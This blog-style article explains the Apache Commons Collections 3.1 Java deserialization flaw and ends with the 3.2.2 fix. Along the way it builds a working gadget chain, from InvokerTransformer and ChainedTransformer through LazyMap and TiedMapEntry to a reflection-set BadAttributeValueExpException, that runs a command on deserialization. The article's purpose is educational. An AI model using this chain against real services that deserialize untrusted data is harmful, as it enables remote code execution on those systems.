---
title: "Bug In Apache Commons Collections"
---

The Apache-Commons-Collections framework is likely familiar to every Java programmer, as it is a very famous open-source framework.

However, it was once exposed for a serialization security vulnerability that could lead to remote command execution.

### Background

Apache Commons is a project of the Apache Software Foundation. The purpose of Commons is to provide reusable, open-source Java code that solves various practical, common problems.

```java
**The Commons Collections package is an excellent supplement to the standard Java Collections API.** On this basis, it provides good encapsulation, abstraction, and supplementation of commonly used data structure operations. This allows us to ensure performance while significantly simplifying code during application development.
```

Commons Collections of version 3.2.1, there is a significant security vulnerability that can be exploited for remote command execution.**

This vulnerability was first disclosed in 2015, but it has been referred to in the industry as "the most underestimated vulnerability of 2015."

Because this library is so widely used, it affected many Java Web Servers first. At the time, this vulnerability swept through the latest versions of WebLogic, WebSphere, JBoss, Jenkins, and OpenNMS.

Later, Gabriel Lawrence and Chris Frohoff presented in "Marshalling Pickles how deserializing objects can ruin your day" how to utilize Apache Commons Collection to achieve arbitrary code execution.

### Reproducing the Issue

This issue primarily occurs in versions of Apache Commons Collections below 3.2.1. In this test, we use version 3.1 and JDK version Java 8.

#### Attacking with Transformer

Commons Collections provides a `Transformer` interface, which is mainly used for type conversion. One implementation class of this interface is related to the vulnerability we are introducing today: `InvokerTransformer`.

**`InvokerTransformer` provides a `transform` method, whose core code is only 3 lines. Its primary role is to instantiate the incoming object via reflection and then execute its `iMethodName` method.**

![][2]

The `iMethodName` to be called and the `iArgs` to be used are actually set when the `InvokerTransformer` class is instantiated. The constructor of this class is as follows:

![][3]

In other words, using this class theoretically allows the execution of any method. Thus, we can use this class to execute external commands in Java.

We know that to execute an external command in Java, we need to use the form `Runtime.getRuntime().exec(cmd)`. So, we find a way to achieve this functionality through the utility class mentioned above.

First, set the method to be executed and its parameters through the `InvokerTransformer` constructor:

``` 
Transformer transformer = new InvokerTransformer("exec",
        new Class[] {String.class},
        new Object[] {"open /Applications/Calculator.app"});
```
    

Through the constructor, we set the method name to `exec` and the command to be executed to `open /Applications/Calculator.app`, which opens the calculator program on a Mac (Windows command: `C:\\Windows\\System32\\calc.exe`).

Then, implement the instantiation of the `Runtime` class via `InvokerTransformer`:

``` 
transformer.transform(Runtime.getRuntime());
```
    

After running the program, the external command will be executed, opening the calculator program on the computer:

![][4]

At this point, we know we can use `InvokerTransformer` to call external commands. So, is it just a matter of serializing a custom `InvokerTransformer` into a string and then deserializing it to achieve remote command execution?

![][5]

First, serialize the `transformer` object into a file, then read it from the file and execute its `transform` method to achieve the attack.

#### Do you think that's all?

However, if it were that simple, this vulnerability would have been discovered long ago. To truly achieve an attack, there are a few more things to do.

Because code like `newTransformer.transform(Runtime.getRuntime());` would not actually be written by anyone.

Without this line of code, can external command execution still be achieved?

This requires utilizing another tool provided in Commons Collections, which is `ChainedTransformer`, an implementation class of `Transformer`.

**The `ChainedTransformer` class provides a `transform` method. Its function is to iterate through its `iTransformers` array and call their `transform` methods in sequence. Each call returns an object that can serve as the parameter for the next call.**

![][6]

So, we can use this feature to implement the same functionality as `transformer.transform(Runtime.getRuntime());` ourselves:

     Transformer[] transformers = new Transformer[] {
        // Use the built-in ConstantTransformer to obtain the Runtime class
        new ConstantTransformer(Runtime.class),
        // Use reflection to call the getMethod method, which then reflects to call the getRuntime method, returning the Runtime.getRuntime() method
        new InvokerTransformer("getMethod",
            new Class[] {String.class, Class[].class },
            new Object[] {"getRuntime", new Class[0] }),
        // Use reflection to call the invoke method, which then reflects to execute the Runtime.getRuntime() method, returning the Runtime instance object
        new InvokerTransformer("invoke",
            new Class[] {Object.class, Object[].class },
            new Object[] {null, new Object[0] }),
        // Use reflection to call the exec method
        new InvokerTransformer("exec",
            new Class[] {String.class },
            new Object[] {"open /Applications/Calculator.app"})
``` 
};
    
Transformer transformerChain = new ChainedTransformer(transformers);
```
    

After obtaining a `transformerChain`, simply calling its `transform` method with any parameter can also open the local calculator program:

![][7]

So, combined with serialization, the attack has progressed further. It is no longer necessary to include code like `newTransformer.transform(Runtime.getRuntime());`. As long as there is a call to the `transformer.transform()` method in the code, regardless of the parameters:

![][8]

#### Attackers won't stop there

However, generally, programmers will not write such code in their programs.

So, the attack method needs to go a step further and truly "not require programmer cooperation."

Thus, attackers discovered a `LazyMap` class provided in Commons Collections, whose `get` method calls the `transform` method. (Commons Collections really knows what hackers are thinking.)

![][9]

So, the current attack direction is to find a way to call the `get` method of `LazyMap` and set its `factory` to our serialized object.

Following the clues, we can find that the `getValue` method of the `TiedMapEntry` class in Commons Collections calls the `get` method of `LazyMap`, and the `getValue` method of `TiedMapEntry` is in turn called by its `toString()` method.

``` java
public String toString() {
    return getKey() + "=" + getValue();
}
    
public Object getValue() {
    return map.get(key);
}
```
    

Now, the barrier to attack is even lower. As long as we construct a `TiedMapEntry` ourselves and serialize it, whenever someone gets this serialized object and calls its `toString` method, it will automatically trigger the bug.

``` 
Transformer transformerChain = new ChainedTransformer(transformers);
    
Map innerMap = new HashMap();
Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");
```
    

We know that `toString` is implicitly called in many situations, such as during output (`System.out.println(ois.readObject());`). The code example is as follows:

![][10]

Now, a hacker only needs to upload the serialized content of their constructed `TiedMapEntry` to an application. After the application deserializes it, if `toString` is called, it will be attacked.

#### As long as there is deserialization, there will be an attack

So, is there any way to make it so that as long as the code deserializes the content we've prepared, it will be attacked?

It turns out there is, as long as the following conditions are met:

That is, the `readObject` method of some class calls the methods related to `LazyMap` or `TiedMapEntry` mentioned above. This is because during Java deserialization, the object's `readObject` method is called.

By digging deeper, hackers found classes such as `BadAttributeValueExpException` and `AnnotationInvocationHandler`. Taking `BadAttributeValueExpException` as an example:

`BadAttributeValueExpException` is an exception class provided in Java. Its `readObject` method directly calls the `toString` method:

![][11]

So, the attacker only needs to find a way to assign the `TiedMapEntry` object to the `valObj` in the code.

By reading the source code, we found that as long as we set the member variable `val` in the `BadAttributeValueExpException` class to an object of type `TiedMapEntry`.

This is easy to achieve using reflection:

``` java
Transformer transformerChain = new ChainedTransformer(transformers);
    
Map innerMap = new HashMap();
Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");
    
BadAttributeValueExpException poc = new BadAttributeValueExpException(null);
    
// val is a private variable, so use the following method to assign a value
Field valfield = poc.getClass().getDeclaredField("val");
valfield.setAccessible(true);
valfield.set(poc, entry);
```
    

At this point, the attack is very simple. One only needs to serialize the `BadAttributeValueExpException` object into a string. As long as this string content is deserialized, the attack will occur.

![][12]

### Problem Resolution

Above, we have reproduced a remote code execution vulnerability related to deserialization brought by the Apache Commons Collections library.

Through the analysis of this vulnerability, we can see that if code is not written rigorously in even one place, it can be exploited by an attacker.

Because this vulnerability has a wide range of impact, it was fixed shortly after it was disclosed. Developers only need to upgrade the Apache Commons Collections library to version 3.2.2 to avoid this vulnerability.

![-w1382][13]

Version 3.2.2 added switches for serialization support for some unsafe Java classes, with the default state being off. The involved classes include:

``` 
CloneTransformer
ForClosure
InstantiateFactory
InstantiateTransformer
InvokerTransformer
PrototypeCloneFactory
PrototypeSerializationFactory,
WhileClosure
```
    

For example, in the `InvokerTransformer` class, it implemented its own `writeObject()` and `readObject()` methods related to serialization:

![][14]

In these two methods, relevant serialization security checks are performed. The implementation code for the checks is as follows:

![][15]

During the serialization and deserialization processes, it checks whether serialization support for some unsafe classes is disabled. If it is disabled, an `UnsupportedOperationException` will be thrown. The switch for this feature is set via `org.apache.commons.collections.enableUnsafeSerialization`.

After upgrading Apache Commons Collections to 3.2.2, executing the example code in the article will result in the following error:

``` 
Exception in thread "main" java.lang.UnsupportedOperationException: Serialization support for org.apache.commons.collections.functors.InvokerTransformer is disabled for security reasons. To enable it set system property 'org.apache.commons.collections.enableUnsafeSerialization' to 'true', but you must ensure that your application does not de-serialize objects from untrusted sources.
    at org.apache.commons.collections.functors.FunctorUtils.checkUnsafeSerialization(FunctorUtils.java:183)
    at org.apache.commons.collections.functors.InvokerTransformer.writeObject(InvokerTransformer.java:155)
```
    

### Afterword

This article introduced a deserialization vulnerability in historical versions of Apache Commons Collections.

If reading this article leads you to the following reflections, then its purpose has been achieved:

1. Code is written by humans, and bugs are understandable.

2. Public basic libraries must place a heavy emphasis on security issues.

3. When using public libraries, always stay informed about their security status and upgrade immediately once a vulnerability is disclosed.

4. The field of security is incredibly deep, and attackers can always find a way to exploit even small bugs.

References:
https://commons.apache.org/proper/commons-collections/release_3_2_2.html
https://p0sec.net/index.php/archives/121/
https://www.freebuf.com/vuls/175252.html
https://kingx.me/commons-collections-java-deserialization.html

 [1]: https://www.hollischuang.com/archives/5177
 [2]: https://www.hollischuang.com/wp-content/uploads/2020/07/15944480560097.jpg
 [3]: https://www.hollischuang.com/wp-content/uploads/2020/07/15944485613275.jpg
 [4]: https://www.hollischuang.com/wp-content/uploads/2020/07/15944494651843.jpg
 [5]: https://www.hollischuang.com/wp-content/uploads/2020/07/15944505042521.jpg
 [6]: https://www.hollischuang.com/wp-content/uploads/2020/07/15944497629664.jpg
 [7]: https://www.hollischuang.com/wp-content/uploads/2020/07/15944539116926.jpg
 [8]: https://www.hollischuang.com/wp-content/uploads/2020/07/15944538564178.jpg
 [9]: https://www.hollischuang.com/wp-content/uploads/2020/07/15944509076736.jpg
 [10]: https://www.hollischuang.com/wp-content/uploads/2020/07/15944537562975.jpg
 [11]: https://www.hollischuang.com/wp-content/uploads/2020/07/15944519240647.jpg
 [12]: https://www.hollischuang.com/wp-content/uploads/2020/07/15944537014741.jpg
 [13]: https://www.hollischuang.com/wp-content/uploads/2020/07/15944526874284.jpg
 [14]: https://www.hollischuang.com/wp-content/uploads/2020/07/15944525715616.jpg
 [15]: https://www.hollischuang.com/wp-content/uploads/2020/07/15944525999226.jpg
